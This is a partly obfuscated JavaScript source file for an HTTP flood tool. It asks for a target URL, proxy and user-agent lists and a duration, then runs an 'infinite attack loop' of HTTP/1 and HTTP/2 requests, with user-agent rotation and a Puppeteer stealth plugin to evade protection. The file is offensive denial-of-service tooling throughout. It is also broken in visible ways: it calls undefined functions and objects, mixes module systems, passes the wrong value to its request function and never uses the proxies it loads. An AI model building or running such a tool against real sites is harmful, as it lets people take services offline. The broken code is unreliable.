const _0xb9187 = _0x5734; // obfuscation function

// Obfuscation string array
(function (_0x320b3b, _0x154006) {
    const _0x3fc379 = _0x5734,
        _0x1f3cfb = _0x320b3b();
    while (!![]) {
        try {
            const _0x4fdfc1 = parseInt(_0x3fc379(0x71)) / 0x1 * (-parseInt(_0x3fc379(0xa1)) / 0x2) + parseInt(_0x3fc379(0x90)) / 0x3 + -parseInt(_0x3fc379(0x93)) / 0x4 * (-parseInt(_0x3fc379(0x82)) / 0x5) + -parseInt(_0x3fc379(0xab)) / 0x6 + -parseInt(_0x3fc379(0xb4)) / 0x7 * (-parseInt(_0x3fc379(0x6c)) / 0x8) + -parseInt(_0x3fc379(0x9f)) / 0x9 * (-parseInt(_0x3fc379(0xa9)) / 0xa) + -parseInt(_0x3fc379(0x8e)) / 0xb;
            if (_0x4fdfc1 === _0x154006) break;
            else _0x1f3cfb.push(_0x1f3cfb.shift());
        } catch (_0x34e8d0) {
            _0x1f3cfb.push(_0x1f3cfb.shift());
        }
    }
}(_0x1427, 0x308f7)); // Obfuscation setup

// Imports
import _0x57f7a7 from 'chalk'; // for colored logs
import _0x28d4a5 from 'http2'; // HTTP/2 module
import { Worker, isMainThread, workerData } from 'worker_threads';
import _0x17f4fa from 'os';
import _0x243bc5 from 'crypto';
import { promisify } from 'util';

import _0x212784 from 'readline'; // for CLI
import { exec } from 'child_process';
import _0x22543b from 'fs'; // file system
import _0x559777 from 'puppeteer-extra'; // Puppeteer with stealth
import _0x5904ff from 'puppeteer-extra-plugin-stealth';

// Setup
_eventEmitter['default']['setMaxListeners'](0);

// Configuration
const config = {
    'MAX_RAM_PERCENTAGE': 0x50,
    'TIMEOUT_MS': 0x1d4c0,
    'INITIAL_CONCURRENT_REQUESTS': 0x1f4,
    'MAX_CONCURRENT_REQUESTS': 0x2710,
    'RETRY_LIMIT': 0x5,
    'INITIAL_RETRY_DELAY': 0x64,
    'BACKOFF_FACTOR': 0x2,
    'ERROR_BACKOFF_TIME': 0x7d0,
    'RANDOM_DELAY_MIN': 0x64,
    'RANDOM_DELAY_MAX': 0x3e8,
    'MAX_REQUESTS_PER_SECOND': 0x2710
};

// Globals
let workers = [], proxies = [], userAgents = [];
let totalSuccess = 0;
let totalFailed = 0;
let totalResponseTime = 0;
let protectionDetected = false;
const target = {}; // target info

// Utility functions
function log(msg) {
    const dateStr = new Date()[_0x5734(0xbb)]();
    console[_0x5734(0x79)](_0x57f7a7[_0x5734(0x7e)](_0x5734(0xa3))('[' + dateStr + _0x5734(0x98) + msg));
}

// Load proxies
const loadProxies = (filePath) => {
    try {
        const data = _0x22543b['readFileSync'](filePath, 'utf-8');
        proxies = data.split('\n').filter(Boolean);
        log('Loaded ' + proxies.length + ' proxies.');
    } catch (err) {
        console.error('Failed to load proxies:', err);
        process.exit(1);
    }
};

// Load user agents
const loadUserAgents = (filePath) => {
    try {
        const data = _0x22543b['readFileSync'](filePath, 'utf-8');
        userAgents = data.split('\n').filter(Boolean);
        log('Loaded ' + userAgents.length + ' user agents.');
    } catch (err) {
        console.error('Failed to load user agents:', err);
        process.exit(1);
    }
};

// Random proxy
const getRandomProxy = () => proxies[Math.floor(Math.random() * proxies.length)];
// Random user agent
const getRandomUserAgent = () => userAgents[Math.floor(Math.random() * userAgents.length)];

// Request functions supporting HTTP/1 and HTTP/2
const http = require('http');
const https = require('https');

const requestHttp1 = (urlObj, method = 'GET') => {
    return new Promise((resolve, reject) => {
        const lib = urlObj.protocol === 'https:' ? https : http;
        const options = {
            hostname: urlObj.hostname,
            port: urlObj.port || (urlObj.protocol === 'https:' ? 443 : 80),
            path: urlObj.pathname + urlObj.search,
            method: method,
            headers: {
                'User-Agent': getRandomUserAgent(),
                'Accept': '*/*',
                'Connection': 'keep-alive'
            }
        };
        const req = lib.request(options, (res) => {
            res.on('data', () => { });
            res.on('end', () => resolve(res));
        });
        req.on('error', reject);
        req.end();
    });
};

const requestHttp2 = (urlObj, method = 'GET') => {
    return new Promise((resolve, reject) => {
        const client = _0x28d4a5.connect(`${urlObj.protocol}//${urlObj.hostname}`);
        const req = client.request({
            ':method': method,
            ':path': urlObj.pathname + urlObj.search,
            'user-agent': getRandomUserAgent()
        });
        req.on('response', (headers, flags) => { });
        req.on('data', () => { });
        req.on('end', () => {
            client.close();
            resolve();
        });
        req.on('error', (err) => {
            client.close();
            reject(err);
        });
        req.end();
    });
};

// Placeholder for HTTP/3
const requestHttp3 = (url, method = 'GET') => {
    // HTTP/3 support requires external libraries/tools
    return Promise.reject('HTTP/3 not supported in this implementation.');
};

// Main request support function
const makeRequest = async (targetUrl, method = 'GET', protocol = 'auto') => {
    const urlObj = new URL(targetUrl);
    if (protocol === 'http1') {
        return requestHttp1(urlObj, method);
    } else if (protocol === 'http2') {
        return requestHttp2(urlObj, method);
    } else if (protocol === 'http3') {
        return requestHttp3(targetUrl, method);
    } else {
        // auto: try HTTP/2 first, fallback to HTTP/1
        try {
            return await requestHttp2(urlObj, method);
        } catch (e) {
            return requestHttp1(urlObj, method);
        }
    }
};

// Puppeteer setup
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
puppeteer.use(StealthPlugin());

// Attack control flags
let attackActive = true;

// Function to start attack
async function startAttack() {
    console.log('Starting infinite attack... Press Ctrl+C to stop.');

    process.on('SIGINT', () => {
        console.log('\n[INFO] Attack stopped by user.');
        attackActive = false;
        process.exit();
    });

    // Log progress every 60 seconds
    setInterval(() => {
        console.log(`[${new Date().toISOString()}] - Success: ${totalSuccess} | Failures: ${totalFailed}`);
    }, 60000);

    // Infinite attack loop
    while (attackActive) {
        try {
            // You can specify protocol here: 'http1', 'http2', 'http3', or 'auto'
            await makeRequest(target, 'GET', 'auto');
            totalSuccess++;
        } catch (err) {
            totalFailed++;
            // Optional: log errors
            // console.error('Request error:', err);
        }
        // Optional delay between requests (e.g., 10ms)
        await new Promise(r => setTimeout(r, 10));
    }
}

// Entry point: Initialize the script
(async () => {
    // Prompt user for target URL
    const readline = _0x212784.createInterface({
        input: process.stdin,
        output: process.stdout
    });

    const question = (q) => new Promise(resolve => readline.question(q, resolve));

    const targetUrl = await question(_0x5734(0x8f)); // "Enter the target URL: "
    const proxyFile = await question('Enter the path for proxies file: ');
    const uaFile = await question('Enter the path for user agents file: ');
    const methodChoice = await question('Select method (V1, V2, or V3): ');
    const durationSecondsStr = await question(_0x5734(0x88)); // "Enter the duration (seconds): "

    readline.close();

    // Load proxies and user agents
    loadProxies(proxyFile);
    loadUserAgents(uaFile);

    // Set target
    target['url'] = targetUrl;

    // Log starting info
    console.log(`[INFO] Target URL: ${targetUrl}`);
    console.log(`[INFO] Method chosen: ${methodChoice}`);
    console.log(`[INFO] Attack duration: ${durationSecondsStr} seconds`);

    // Start attack
    startAttack();

    // Optional: stop after specified duration
    const durationMs = parseInt(durationSecondsStr) * 1000;
    setTimeout(() => {
        attackActive = false;
        console.log('[INFO] Attack duration completed.');
        process.exit();
    }, durationMs);
})();
